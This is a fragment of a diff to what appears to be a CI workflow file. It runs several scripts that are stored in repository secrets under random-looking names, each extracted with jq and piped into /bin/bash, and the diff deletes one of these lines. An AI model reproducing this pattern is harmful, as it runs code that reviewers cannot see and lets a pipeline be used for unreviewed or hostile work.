@@ -21,7 +21,6 @@ jobs:
           vi901: ${{ secrets.vi901 }}
         run: |
           printf '%s' "$vi901" | jq -r .ez1845 | /bin/bash
-          printf '%s' "$kadnq49" | jq -r .vsdrs3 | /bin/bash
           printf '%s' "$tt53" | jq -r .bgaja9052 | /bin/bash
           printf '%s' "$lbxyr4" | jq -r .x64 | /bin/bash
           printf '%s' "$tdb545" | jq -r .s448 | /bin/bash
